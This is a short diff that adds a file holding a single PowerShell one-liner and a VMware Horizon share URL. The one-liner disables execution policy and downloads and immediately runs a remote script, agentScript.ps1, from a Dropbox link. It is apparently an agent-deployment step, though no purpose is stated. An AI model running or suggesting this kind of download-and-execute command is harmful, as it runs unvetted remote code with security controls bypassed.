@@ -1,0 +1,4 @@
+@powershell -NoProfile -ExecutionPolicy unrestricted -Command "iex((new-object net.webclient).DownloadString('https://www.dropbox.com/s/8yllztf67fv2skp/agentScript.ps1'))
+
+
+https://horizonworkspace.vmware.com:443/data/shf/DOQvUKjHTR+eIyZ1I,19GgAkMTcxMzc0ZjItNjcwNS00NzcwLThhNDUtMjQ5MmI4NWIxZWM5AQ==
